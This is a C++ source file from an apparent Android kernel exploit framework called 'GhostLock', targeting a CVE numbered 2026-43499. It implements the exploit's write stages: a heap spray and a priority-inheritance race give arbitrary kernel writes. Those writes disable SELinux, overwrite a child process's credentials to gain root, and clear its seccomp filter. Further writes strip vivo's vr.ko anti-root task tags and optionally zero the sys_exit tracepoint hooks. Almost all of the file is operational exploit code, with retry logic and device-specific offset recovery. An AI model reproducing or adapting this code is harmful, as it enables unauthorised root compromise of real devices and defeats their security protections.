/*
 * GhostLock — cve_2026_43499 backend procedure (Batch 4, D1=B).
 *
 * The setup stage, the W1-W3 step sequence and the shared write/retry
 * primitives moved out of the retired ExploitProcedure. The middleware policy
 * is a template parameter: route hooks are direct static calls on `Middleware`
 * (Batch 4 review P1-B), so the catalogued middleware each instantiate their
 * own backend code. The body is otherwise unchanged: same statements, same
 * order, same log text.
 */

#include "session/backend/cve_2026_43499_backend.hpp"

#include "session/backend/cfi_stage.hpp"

#include "attack/ops.hpp"
#include "bootimg/extract.h"
#include "bootimg/physmap.h"
#include "common.h"
#include "kernel/target.h"
#include "kernelsnitch/utils.h"
#include "profile/macros.h"
#include "race/threads.hpp"
#include "route/route_api.hpp"
#include "route/route_middleware.hpp"
#include "route/route_policy.hpp"
#include "session/handoff_probe.hpp"
#include "session/victim_process.hpp"
#include "support/decls.hpp"
#include "support/fatal_error.hpp"
#include "support/run_state.hpp"

#include <unistd.h>

#include <array>
#include <cstdint>
#include <cstdlib>
#include <span>
#include <string>
#include <vector>
#include <optional>
#include <string_view>
#include <utility>

namespace ghostlock::session::backend {
    namespace {
        /* Shared write/retry sequence. */
        template <class M>
        Status retry_write_stage(
            ExploitSession &session,
            const char *stage,
            uintptr_t target,
            int32_t mode,
            uint32_t attempts,
            useconds_t settle_usec,
            write_stage_verify_fn verify,
            void *context,
            int32_t leaf) {

            /* no attempt can move a target that is wrong by construction, and the
             * stage belongs in the log with the address rather than the route */
            if (!attack::in_direct_map(target)) {
                pr_warning("%s: target 0x%016zx is outside the direct map, not attempting\n", stage, target);
                return false;
            }

            const auto request = memory::WriteRequest::make(target, static_cast<memory::WriteMode>(mode), leaf != 0);

            for (uint32_t attempt = 1; attempt <= attempts; attempt++) {
                pr_info("%s attempt %u/%u\n", stage, attempt, attempts);

                /* the previous attempt's write can land after its verify read; check
                 * before paying for another heap spray */
                if (attempt > 1 && verify(context)) {
                    return true;
                }
                if (attempt == 1) {
                    attack::slab_drain();
                }
                if (static_cast<memory::WriteMode>(mode) == memory::WriteMode::Credential) {
                    if (!M::w2_fast_repair_prebuild(session)) return false;
                }
                Status routed = Cve2026_43499Policy::template attack_write<M>(session, request, stage);
                if (!routed) {
                    support::discard_prebuilt_page();
                    pr_warning("%s attempt %u route failed; backing off\n", stage, attempt);
                    usleep(100000);
                    continue;
                }
                if (static_cast<memory::WriteMode>(mode) == memory::WriteMode::Credential) {
                    if (!M::w2_fast_repair_activate(session)) return false;
                }
                if (settle_usec) usleep(settle_usec);
                if (verify(context)) return true;
                usleep(50000);
            }
            /* the last write can land after its verify read */
            return verify(context) != 0;
        }

        /* W3 chain retry: park the previous rooted child on its command pipe so the
         * late-load stage can still start a root shell from it. */
        void park_retry_child(ExploitSession &session, VictimChain &chain,
                              const uint32_t round, const uint32_t chain_rounds) {
            victim::VictimContext &pipes = session.victim;
            pr_warning("W3 chain retry %u/%u: parking rooted child\n",
                       round, chain_rounds);
            if (chain.child_alive && pipes.child() > 0) {
                write(pipes.cmd_write.get(), "P", 1);
                usleep(50000);
                session.parked_victim = pipes.release_child();
                session.parked_victim_cmd = std::move(pipes.cmd_write);
            } else {
                pipes.cmd_write.reset();
            }
            pipes.uid_read.reset();
            chain.child_alive = 1;
            chain.seccomp_ok = 0;
        }

        /* Spawn one victim, clear the vivo tag (when built) and write the credential.
         * Retry means the perf leak missed and the chain should respawn. */
        template <class M>
        VictimRound w2(ExploitSession &session, VictimChain &chain,
                       victim::w2_stage_context &w2_context,
                       uintptr_t &child_task) {
            victim::VictimContext &pipes = session.victim;
            int32_t &child_alive = chain.child_alive;

            const auto spawned = victim::spawn_victim(pipes);
            if (!spawned) {
                pr_warning("fork failed\n");
                return VictimRound::Failed;
            }
            child_task = spawned->task;
            attack::timer_mark("perf_find_task done");

            if (!child_task) {
                /* nothing rooted yet; safe to kill and burn a round */
                pr_warning("perf leak did not reproduce; retrying next round\n");
                const pid_t unrooted = pipes.release_child();
                if (unrooted > 0) {
                    kill(-unrooted, SIGKILL);
                    waitpid(unrooted, nullptr, 0);
                }

                child_alive = 0;
                pipes.cmd_write.reset();
                pipes.uid_read.reset();
                return VictimRound::Retry;
            }

            pr_info("child_pid=%d child_task=0x%016zx\n", pipes.child(), child_task);
            /* ------------------------------------------------------------------
         * vivo vr.ko anti-root per-task bypass (ported from root.c)
         * ------------------------------------------------------------------
         * Always compiled: the /proc/modules probe below decides at runtime
         * whether the writes run. The tag-B offset is overridable at build time
         * (profile/macros.h), not gated by a define.
         *
         * vr.ko tags every app-origin task at fork/clone time. When the task
         * later holds euid 0, the sys_exit tracepoint probe kills it. We must
         * strip the tag BEFORE W2 verify runs the child's getuid().
         *
         * This exploit primitive is 64-bit granular, so:
         *   – task+0x00 (thread_info.flags) covers tag A at +0x06 and also
         *     clears the syscall-tracepoint bit (0x400). This takes the task
         *     off the sys_exit slow-path immediately.
         *   – tag B is at +0x2c. We align down to 8 bytes (0x28) and zero the
         *     whole word. VERIFY ON-DEVICE that zeroing bytes 0x28-0x2f is
         *     safe on your 6.1.145 kernel; if not, comment out the tagB write.
         * ------------------------------------------------------------------ */
            support::run_state::enter("w2b");
            {
                /* --------------------------------------------------------------
                 * 运行时 vr.ko tag 偏移提取（原 1.3 载荷功能，overlay 覆盖时丢失）
                 *
                 * 下面的逐任务清零写的是编译期 VR_TAG_B_OFF。vivo/iQOO 设备上
                 * 权威偏移在 vendor_boot ramdisk 的 vr.ko 里，所以这里把它恢复出来，
                 * 并在与编译期值不一致时明确告警——而不是静默清错字节对。
                 * 非致命：失败就退回内置默认值。
                 * -------------------------------------------------------------- */
                const char* home_dir = getenv("GHOSTLOCK_HOME");
                std::string staged_boot = home_dir ? std::string(home_dir) + "/boot.img" : std::string();
                const char* boot_paths_for_brand_check[] = {
                    staged_boot.empty() ? nullptr : staged_boot.c_str(),
                    "/dev/block/by-name/boot_a",
                    "/dev/block/by-name/boot",
                    "/boot", "/dev/boot", "/oem/boot", "/vendor/boot", nullptr
                };
                std::vector<std::uint8_t> boot_data;
                for (int32_t bp = 0; boot_paths_for_brand_check[bp]; ++bp) {
                    auto seg_res = ghostlock::bootimg::load_boot_image(boot_paths_for_brand_check[bp]);
                    if (seg_res.has_value()) {
                        boot_data.assign(seg_res.value().begin(), seg_res.value().end());
                        break;
                    }
                }

                /* 属性优先（权威），boot 字节仅作回落。 */
                std::string brand = ghostlock::bootimg::detect_device_brand_runtime(
                    std::span<const std::uint8_t>(boot_data));

                if (brand == "vivo" || brand == "iqoo") {
                    pr_info("VR: detected %s device, loading vendor_boot for dynamic VRKO offsets...\n", brand.c_str());
                    std::string staged_vb = home_dir
                            ? std::string(home_dir) + "/vendor_boot.img" : std::string();
                    const char* vendor_boot_paths[] = {
                        staged_vb.empty() ? nullptr : staged_vb.c_str(),
                        "/dev/block/by-name/vendor_boot_a",
                        "/dev/block/by-name/vendor_boot",
                        "/vendor/boot", "/dev/vendor_boot", "/oem/vendor_boot", nullptr
                    };
                    std::vector<std::uint8_t> vendor_boot_data;
                    for (int32_t vp = 0; vendor_boot_paths[vp]; ++vp) {
                        auto vb_res = ghostlock::bootimg::load_boot_image(vendor_boot_paths[vp]);
                        if (vb_res.has_value()) {
                            vendor_boot_data.assign(vb_res.value().begin(), vb_res.value().end());
                            pr_success("VR: loaded vendor_boot from %s\n", vendor_boot_paths[vp]);
                            break;
                        }
                    }

                    if (vendor_boot_data.empty()) {
                        pr_warning("VR: %s device without vendor_boot.img; "
                                   "vr.ko tag offsets stay at the built-in defaults\n",
                                   brand.c_str());
                        pr_warning("VR: import vendor_boot.img to parse the real "
                                   "offsets, otherwise the run will likely fail\n");
                    } else {
                        const ghostlock::bootimg::VrKoProbeResult vrko_res =
                            ghostlock::bootimg::probe_vrko_from_vendor_boot(
                                std::span<const std::uint8_t>(vendor_boot_data));
                        if (vrko_res.valid) {
                            pr_success("VR: recovered tag_A=0x%lx tag_B=0x%lx from %s\n",
                                       static_cast<unsigned long>(vrko_res.tag_a_offset),
                                       static_cast<unsigned long>(vrko_res.tag_b_offset),
                                       vrko_res.module_path.c_str());
                            if (vrko_res.tag_b_offset != static_cast<std::uint64_t>(VR_TAG_B_OFF)) {
                                pr_warning("VR: module tags at 0x%lx but this build clears 0x%x; "
                                           "rebuild with -DVR_TAG_B_OFF=0x%lx if the run fails\n",
                                           static_cast<unsigned long>(vrko_res.tag_b_offset),
                                           static_cast<unsigned>(VR_TAG_B_OFF),
                                           static_cast<unsigned long>(vrko_res.tag_b_offset));
                            }
                        } else {
                            pr_warning("VR: vendor_boot present but no vr.ko offsets: %s\n",
                                       vrko_res.error_msg.c_str());
                            pr_warning("VR: per-task clear stays on the built-in defaults\n");
                        }
                    }
                } else {
                    pr_info("VR: device brand=%s, vendor_boot VRKO detection skipped (non-vivo/iQOO)\n", brand.c_str());
                }

                static int32_t vr_needed = -1;
                if (vr_needed < 0) {
                    vr_needed = 1; /* /proc/modules unreadable: assume loaded */
                    if (FILE *m = fopen("/proc/modules", "r")) {
                        auto close_modules = ghostlock::support::make_scope_exit(
                            [m]() noexcept { fclose(m); });
                        std::array<char, 256> mod{};
                        vr_needed = 0;
                        while (fgets(mod.data(), static_cast<int32_t>(mod.size()), m)) {
                            const std::string_view line(mod.data());
                            /* strncasecmp(mod, "vr", 2): a case-insensitive prefix,
                             * then the module-name separator. */
                            const bool vr_prefix =
                                    line.size() >= 2 &&
                                    (line[0] == 'v' || line[0] == 'V') &&
                                    (line[1] == 'r' || line[1] == 'R');
                            if (vr_prefix && line.size() > 2 &&
                                (line[2] == ' ' || line[2] == '_')) {
                                vr_needed = 1;
                                break;
                            }
                        }
                    }
                    pr_info("vr.ko %s\n", vr_needed
                            ? "loaded; clearing tags"
                            : "not loaded; skipping tag clear");
                }

                int32_t vr_ok = 1;
                if (vr_needed) {
                    /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit).
                     *
                     * This one stays a whole-word zero and is the only write here
                     * that has to be: tag A lives in byte +6 *of this very word*,
                     * and the syscall-tracepoint bit (TIF_SYSCALL_TRACEPOINT) is
                     * in it too. Both must be gone before W2's getuid() probe, and
                     * this runs before the CFI channel exists, so there is no read
                     * to build a mask from. The collateral (TIF_SIGPENDING,
                     * TIF_NEED_RESCHED, ...) is bounded: the victim child is a
                     * tight getuid() loop that takes no signals and is preempted by
                     * the timer on the syscall-return path regardless. Doing this
                     * as a read-modify-write needs the resident read to exist
                     * before W2, which is the separate, re-verified change noted in
                     * the step-3 design document. */
                    const memory::WriteRequest flags_request = memory::WriteRequest::make(
                        child_task + kernel::TASK_THREAD_INFO_FLAGS_OFF, memory::WriteMode::Zero, 1);
                    vr_ok &= Cve2026_43499Policy::template attack_write<M>(session, flags_request, "VR: flags+tagA");

                    /* 2) Clear tag B's word (64-bit aligned down).
                     *
                     * Tag B sits at +0x2c, inside the 8-byte word this zeroes.
                     * That word is `struct thread_info`'s preempt_count union
                     * (`{ u32 count; u32 need_resched; }` on little-endian), so
                     * the write also drives preempt_count and need_resched to
                     * zero for this task -- telling the kernel it cannot be
                     * preempted, for a window in which it still can.
                     *
                     * That collateral is real, and it is NOT fixed here. The
                     * obvious fix (read the word, clear only the tag byte, write
                     * it back) needs a kernel read in this window, and this runs
                     * before the CFI channel exists. Switching write mode does not
                     * help either: the attack primitive's minimum granularity is
                     * 8 bytes whichever arm carries it, so `WriteMode::Value`
                     * would store exactly the same word. The fix is to move the
                     * CFI channel ahead of W2 and use its read -- an attack-order
                     * change that has to be re-verified end to end, deliberately
                     * left out of this batch. See the step-3 design document. */
                    if (vr_ok) {
                        const uintptr_t tagb_align = (child_task + VR_TAG_B_OFF) & ~7ULL;
                        const memory::WriteRequest tagb_request =
                                memory::WriteRequest::make(tagb_align, memory::WriteMode::Zero, 1);
                        vr_ok &= Cve2026_43499Policy::template attack_write<M>(session, tagb_request, "VR: tagB");
                    }

                    if (vr_ok) {
                        pr_success("VR.ko per-task tags cleared\n");
                    } else {
                        pr_warning("VR.ko tag clear failed; child may be killed during W2 verify\n");
                    }
                }
            }
                /* --------------------------------------------------------------
                 * 全局开关（原 1.3 载荷功能）：解析 &__tracepoint_sys_exit->funcs
                 * 优先取 profile；缺失时从内核内嵌 kallsyms/BTF 运行时恢复。
                 *
                 * 注意：真正那一笔“把 funcs 指针清零”的内核写默认【关闭】——
                 * CFI 阶段（neutralize_vr_probes）需要读 sys_exit funcs[] 才能定位
                 * vr.ko 的模块内探针槽并只改那一个槽；若先把整个指针清零，CFI
                 * 扫描就会落空。粗粒度写与细粒度中和是同一目标的两代方案，保留
                 * 细粒度那代，粗粒度留码门住：-DGHOSTLOCK_LEGACY_SYSEXIT_KILLSWITCH=1
                 * -------------------------------------------------------------- */
                /* &__tracepoint_sys_exit->funcs = tracepoint image address + the
                 * funcs slot offset. The chain's profile carries the tracepoint
                 * image address (sys_exit_tp_off), not a pre-summed funcs pointer. */
                uintptr_t tp_funcs = 0;
                {
                    const uintptr_t tp_image = ghostlock::profile::sys_exit_tp_image();
                    const size_t funcs_off = ghostlock::profile::tracepoint_funcs_off();
                    if (tp_image && funcs_off) tp_funcs = tp_image + funcs_off;
                }
                if (!tp_funcs) {
                    pr_info("VR: sys_exit_tp_funcs not in profile; trying bootimg extraction\n");
                    const char *boot_paths[] = {
                        "/boot", "/dev/kcore", "/oem/boot", "/vendor/boot", nullptr
                    };
                    for (int32_t p = 0; boot_paths[p]; ++p) {
                        auto seg_res = ghostlock::bootimg::load_boot_image(boot_paths[p]);
                        if (!seg_res.has_value()) continue;
                        auto val = ghostlock::bootimg::recover_sys_exit_tp_funcs(
                            std::span<const std::uint8_t>(seg_res.value()));
                        if (val.has_value()) {
                            tp_funcs = *val;
                            pr_success("VR: recovered sys_exit_tp_funcs=0x%lx from %s\n",
                                       tp_funcs, boot_paths[p]);
                            break;
                        }
                    }
                    if (!tp_funcs) {
                        pr_warning("VR: sys_exit_tp_funcs recovery failed; "
                                   "falling back to per-task clear only\n");
                    }
                } else {
                    pr_info("VR: sys_exit_tp_funcs=0x%lx (profile)\n", tp_funcs);
                }
                if (tp_funcs && (!attack::in_direct_map(tp_funcs) || (tp_funcs & 7u) != 0)) {
                    pr_warning("VR: sys_exit funcs target 0x%016zx rejected "
                               "(outside the direct map or misaligned); "
                               "relying on the per-task clear\n", tp_funcs);
                    tp_funcs = 0;
                }
#if defined(GHOSTLOCK_LEGACY_SYSEXIT_KILLSWITCH) && GHOSTLOCK_LEGACY_SYSEXIT_KILLSWITCH
                static int32_t vr_global_done = 0;
                if (!vr_global_done && tp_funcs) {
                    const memory::WriteRequest tp_request = memory::WriteRequest::make(
                        tp_funcs, memory::WriteMode::Zero, 1);
                    const uint32_t tp_attempts =
                        std::min<uint32_t>(g_exploit_session.profile.w2_attempts(), 2u);
                    for (uint32_t attempt = 1; attempt <= tp_attempts; attempt++) {
                        if (attempt > 1) {
                            pr_warning("VR: sys_exit tp write %u missed; backing off\n", attempt);
                            usleep(100000);
                        }
                        if (Cve2026_43499Policy::template attack_write<M>(
                                session, tp_request, "VR: sys_exit tp")) {
                            vr_global_done = 1;
                            usleep(g_exploit_session.profile.w2_settle_us());
                            pr_success("VR.ko sys_exit probes disabled globally\n");
                            break;
                        }
                    }
                    if (!vr_global_done) {
                        pr_warning("VR: global disable missed; relying on per-task clear\n");
                    }
                }
#else
                if (tp_funcs) {
                    pr_info("VR: sys_exit kill-switch write disabled (CFI stage owns neutralisation)\n");
                }
#endif
            support::run_state::complete("w2b");

            support::run_state::enter("w2a");
            Status got_root = retry_write_stage<M>(
                session, "W2: cred", child_task + ghostlock::profile::task_cred_off(), 2,
                g_exploit_session.profile.w2_attempts(),
                g_exploit_session.profile.w2_settle_us(),
                victim::verify_w2_stage, &w2_context, 0);
            if (!got_root) {
                write(pipes.cmd_write.get(), "X", 1);
                pipes.cmd_write.reset();
                pipes.uid_read.reset();
                pr_warning("W2 failed after %u rounds\n",
                           g_exploit_session.profile.w2_attempts());
                waitpid(pipes.child(), nullptr, WNOHANG);
                return VictimRound::Failed;
            }
            support::run_state::complete("w2a");
            chain.ever_rooted = 1;
            /* rooted children never exit; chain failures park (P) */
            return VictimRound::Rooted;
        }

        /* Clear TIF_SECCOMP and seccomp.mode on the rooted child. Returns true when the
         * child probe reports a filter-free fork. */
        template <class M>
        bool w3(ExploitSession &session, VictimChain &chain,
                victim::w2_stage_context &w2_context,
                uintptr_t child_task) {
            victim::VictimContext &pipes = session.victim;
            int32_t &child_alive = chain.child_alive;
            int32_t &seccomp_ok = chain.seccomp_ok;

            /* W3: clear the child's seccomp filter for the independent root shell
         * (adb/shell skips). fork() re-arms TIF_SECCOMP while mode != 0, so mode
         * must be zeroed too; do both writes back-to-back with one probe
         * (real finit_module calls trip vendor root guards).
         * tcp stamps *(target) exactly, so aim straight at thread_info.flags
         * (task+0) / seccomp.mode; only the pselect fallback needs the comm
         * probe to tell [target] from [target+8]. */
            if (!attack::process_has_seccomp()) {
                pr_success("no app seccomp filter (adb/shell flow); skipping W3\n");
                seccomp_ok = 1;
                return true;
            }

            constexpr bool exact_target = M::w3_exact_target;
            victim::w3_stage_context w3_context = {
                .pipes = pipes,
                .leaf_to_target8 = !exact_target,
            };
            if (!exact_target) {
                support::run_state::enter("w3a");
                Status dir_ok = retry_write_stage<M>(
                    session, "W3-0: leaf dir", child_task + ghostlock::profile::task_comm_off(), 1, 4, 50000,
                    victim::verify_leaf_dir_stage, &w3_context, 1);
                if (!dir_ok) {
                    /* U01/S14: upstream retires the child instead of guessing the leaf
                 * direction and blind-writing the task neighbour. Returning false
                 * hands control back to the W2/W3 chain, which parks this child and
                 * spawns a fresh one for the next round. */
                    pr_warning("W3 leaf direction probe failed; retiring child\n");
                    return false;
                }
                support::run_state::complete("w3a");
            } else {
                support::run_state::complete("w3a");
            }

            uintptr_t flags_target = w3_context.leaf_to_target8
                                         ? child_task - 8
                                         : child_task + kernel::TASK_THREAD_INFO_FLAGS_OFF;
            uintptr_t mode_target = w3_context.leaf_to_target8
                                        ? child_task + ghostlock::profile::task_seccomp_off() - 8
                                        : child_task + ghostlock::profile::task_seccomp_off();

            uint32_t w3_attempts = g_exploit_session.profile.w3_attempts();
            for (uint32_t attempt = 1; attempt <= w3_attempts; attempt++) {
                pr_info("W3: TIF_SECCOMP+mode attempt %u/%u\n", attempt, w3_attempts);
                if (attempt == 1) attack::slab_drain();
                support::run_state::enter("w3b");
                const memory::WriteRequest flags_request =
                        memory::WriteRequest::make(flags_target, memory::WriteMode::Zero, 1);
                Status routed = Cve2026_43499Policy::template attack_write<M>(session, flags_request, "W3: TIF_SECCOMP");
                if (!routed) {
                    pr_warning("W3 attempt %u route failed; backing off\n", attempt);
                    usleep(100000);
                    continue;
                }
                support::run_state::complete("w3b");
                usleep(g_exploit_session.profile.w3_settle_us());
                support::run_state::enter("w3c");
                const memory::WriteRequest mode_request =
                        memory::WriteRequest::make(mode_target, memory::WriteMode::Zero, 1);
                routed = Cve2026_43499Policy::template attack_write<M>(session, mode_request, "W3: seccomp mode");
                if (!routed) {
                    pr_warning("W3 attempt %d mode route failed; backing off\n", attempt);
                    usleep(100000);
                    continue;
                }
                support::run_state::complete("w3c");
                usleep(g_exploit_session.profile.w3_settle_us());
                int32_t st = 0;
                if (waitpid(pipes.child(), &st, WNOHANG) == pipes.child()) {
                    pr_warning("W3 lost the child (status=0x%x); chain will retry\n", st);
                    pipes.mark_child_exited();
                    child_alive = 0;
                    break;
                }
                if (victim::verify_seccomp_probe_stage(&w2_context)) {
                    seccomp_ok = 1;
                    break;
                }
                usleep(g_exploit_session.profile.w3_settle_us());
            }

            if (!seccomp_ok) {
                pr_warning("W3 seccomp clear failed; ksud late-load will likely stay blocked\n");
                return false;
            }
            pr_success("child seccomp fully bypassed (forked workers run filter-free)\n");
            return true;
        }

        /* W1b: the non-resident multicast middleware repairs its private scratch
         * page before W2. The body stays here because it calls the shared write
         * primitive; whether it is needed is a capability of the middleware. */
        template <class M>
        bool w1_scratch_repair(ExploitSession &session) {
            if constexpr (!M::multicast) {
                return true;
            } else {
                const profile::MulticastWaiterLayout mcast = session.profile.multicast_layout();
                const uintptr_t w1_scratch_poison =
                        (session.heap.current.base) + mcast.buffer_size.value_or(0);
                if (!support::quarantine_reclaim_sockets()) {
                    pr_warning("W1 scratch page quarantine failed\n");
                    return false;
                }
                int32_t repaired = 0;
                const uint32_t repair_attempts =
                        g_exploit_session.profile.w1_scratch_repair_attempts();
                for (uint32_t repair_try = 1; repair_try <= repair_attempts; repair_try++) {
                    pr_info("W1b: private scratch repair attempt %u/%u\n",
                            repair_try, repair_attempts);
                    const memory::WriteRequest scratch_repair = memory::WriteRequest::make(
                        w1_scratch_poison, memory::WriteMode::Zero, 1);
                    if (Cve2026_43499Policy::template attack_write<M>(
                            session, scratch_repair, "W1b: private scratch repair")) {
                        repaired = 1;
                        break;
                    }
                    usleep(50000);
                }
                if (repaired) {
                    pr_success("private scratch repaired; releasing quarantine\n");
                    support::release_quarantined_reclaim_sockets();
                    return true;
                }
                pr_warning("private scratch repair failed; keeping page quarantined\n");
                return false;
            }
        }

        /* Stage: W1 SELinux plus the middleware-specific scratch / resident repair. */
        template <class M>
        StageResult w1(ExploitSession &session) {
            /* W1: disable SELinux before task discovery. untrusted_app may not be able
         * to read enforce while it is still enforcing, so attempt W1 regardless. */
            Status selinux_ok = attack::check_selinux_off();
            if (!selinux_ok) {
                if (!attack::enforce_readable()) {
                    pr_warning("SELinux enforce unreadable; assuming enforcing and running W1\n");
                }
                attack::timer_mark("pre-W1 drain");
                uint32_t w1_attempts = g_exploit_session.profile.w1_attempts();
                if constexpr (M::multicast) {
                    /* a non-resident multicast write cannot safely retry a missed W1 */
                    w1_attempts = 1;
                }
                support::run_state::enter("w1a");
                selinux_ok = retry_write_stage<M>(
                    session,
                    "W1: SELinux",
                    session.addresses.data_alias(ghostlock::profile::selinux_enforcing()),
                    1, w1_attempts,
                    g_exploit_session.profile.w1_settle_us(),
                    victim::verify_selinux_stage, nullptr, 0);

                if (!selinux_ok) {
                    pr_warning("Write 1 failed\n");
                    return StageResult::Failed;
                }
                support::run_state::complete("w1a");
                support::run_state::enter("w1b");
                if (!w1_scratch_repair<M>(session)) return StageResult::Failed;
                support::run_state::complete("w1b");
                attack::timer_mark("Write 1 complete");
            } else {
                pr_success("SELinux already permissive\n");
                support::run_state::complete("w1a");
                support::run_state::complete("w1b");
            }
            return StageResult::Continue;
        }
    } // namespace

    /* Stage: process setup and profile installation. */
    StageResult Cve2026_43499Policy::run_setup(ExploitSession &session,
                                               const profile::kernel_offsets &decoded,
                                               const char *debug_dir, bool force_attack) {
        session.heap.init();
        support::disable_rseq_for_thread();
        kernel::set_unbuffer();
        signal(SIGPIPE, SIG_IGN);
        kernel::set_limit();
        route::reserve_standard_io();
        if (config::runtime_config_snapshot().init() != 0) {
            pr_error("runtime configuration failed errno=%d\n", errno);
            throw FatalError{};
        }
        if (debug_dir && debug_dir[0])
            config::runtime_config_snapshot().debug_dir = debug_dir;
        if (!session.profile.loaded())
            attack::install_profile(decoded);
        /* Robustness guard: running the attack where KernelSU already owns root
         * drives the re-enforce path that panics the kernel at the first PI
         * route, and the objective is already met. Bail out cleanly instead; a
         * cold boot clears the module for a real run. The forced test skips
         * this check on purpose and relies on the root script discarding the
         * child. */
        if (!force_attack && ksu_root_owned()) {
            pr_warning("KernelSU already has root; skipping exploit "
                "(cold boot for a clean run, or enable the forced test)\n");
            return StageResult::Done;
        }
        attack::write_root_script();

        attack::apply_iomem_cache();
        support::log_startup_context();
        support::init_p0_profile();
        kernel::pin_to_core(static_cast<size_t>(config::runtime_config_snapshot().main_cpu));
        pr_info("main thread running on cpu=%d\n", sched_getcpu());

        attack::timer_reset();
        attack::timer_mark("exploit start");
        return StageResult::Continue;
    }

    /* One route write: middleware resident fast path, else heap spray + PI race.
     * Shared statement order; the middleware policy decides the resident step. */
    template <class M>
    Status Cve2026_43499Policy::attack_write(ExploitSession &session,
                                             const memory::WriteRequest &request,
                                             const char *desc) {
        pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc,
                request.target, static_cast<int32_t>(request.mode),
                !request.preserve_child);
        if (!attack::in_direct_map(request.target)) {
            pr_warning("  target is outside the direct map, not writing\n");
            return 0;
        }

        /* Both transports write *(target) := value through the erase left-only
         * relink: waiter words are {pc = value, right = 0, left = target} and
         * the node is RED so no color fixup runs. leaf=1 is the value=0 payload. */
        attack::timer_mark("  heap spray start");
        (session.heap.current.base) = support::prepare_good_kernel_page(request);
        if (!(session.heap.current.base)) {
            pr_warning("  heap spray failed\n");
            return 0;
        }

        attack::timer_mark("  heap spray done");
        Status routed = route::middleware::run_middleware_route(session, request);

        attack::timer_mark("  PI route done");
        if (!routed) {
            pr_warning("  PI route did not produce a verified write\n");
        }

        return routed;
    }

    template <class M>
    StageResult Cve2026_43499Policy::run(ExploitSession &session,
                                         const profile::kernel_offsets &decoded,
                                         const char *debug_dir, bool force_attack,
                                         VictimChain &chain) {
        switch (run_setup(session, decoded, debug_dir, force_attack)) {
            case StageResult::Failed:
                return StageResult::Failed;
            case StageResult::Done:
                return StageResult::Done;
            case StageResult::Continue:
                break;
        }
        switch (w1<M>(session)) {
            case StageResult::Failed:
                return StageResult::Failed;
            case StageResult::Done:
                return StageResult::Done;
            case StageResult::Continue:
                break;
        }

        /* W2+W3 as a retryable chain: a missed W3 write or probe can kill the
         * child, so respawn and redo. */
        attack::slab_drain();
        attack::timer_mark("pre-W2 drain");
        victim::w2_stage_context w2_context = {.pipes = session.victim};
        const uint32_t chain_rounds = g_exploit_session.profile.w3_chain_rounds();
        for (uint32_t round = 1; round <= chain_rounds; round++) {
            if (round > 1) park_retry_child(session, chain, round, chain_rounds);

            uintptr_t child_task = 0;
            const VictimRound rooted = w2<M>(session, chain, w2_context, child_task);
            if (rooted == VictimRound::Failed) return StageResult::Failed;
            if (rooted == VictimRound::Retry) continue;
            if (w3<M>(session, chain, w2_context, child_task)) break;
        }
        if (!chain.seccomp_ok) {
            pr_warning("W3 seccomp bypass failed after %u chain rounds; ksud late-load will likely stay blocked\n",
                       chain_rounds);
        }

        /* The CFI stage -- and with it the vr.ko probe neutralisation -- does NOT
         * run here any more. It is dispatched by Pipeline::run *after* the
         * frontend handoff, i.e. once the rooted child has settled KernelSU.
         * Ordering matters: swapping &ashmem_misc.fops for a forged table and
         * rewriting the sys_exit tracepoint funcs array happens while the
         * framework is coming up, and doing that before root has been handed to
         * KernelSU is what soft-reboots the device. See route/pipeline.hpp. */

        /* The frontend handoff step finishes the run. */
        return StageResult::Continue;
    }

    /* Explicit instantiations: the catalogued middleware policies. Callers only
     * include the header; the definitions stay in this unit. */
    template StageResult Cve2026_43499Policy::run<route::SelectPolicy>(
        ExploitSession &, const profile::kernel_offsets &, const char *, bool, VictimChain &);
    template StageResult Cve2026_43499Policy::run<route::TcpPolicy>(
        ExploitSession &, const profile::kernel_offsets &, const char *, bool, VictimChain &);
    template StageResult Cve2026_43499Policy::run<route::MulticastPolicy>(
        ExploitSession &, const profile::kernel_offsets &, const char *, bool, VictimChain &);

    template Status Cve2026_43499Policy::attack_write<route::SelectPolicy>(
        ExploitSession &, const memory::WriteRequest &, const char *);
    template Status Cve2026_43499Policy::attack_write<route::TcpPolicy>(
        ExploitSession &, const memory::WriteRequest &, const char *);
    template Status Cve2026_43499Policy::attack_write<route::MulticastPolicy>(
        ExploitSession &, const memory::WriteRequest &, const char *);
} // namespace ghostlock::session::backend
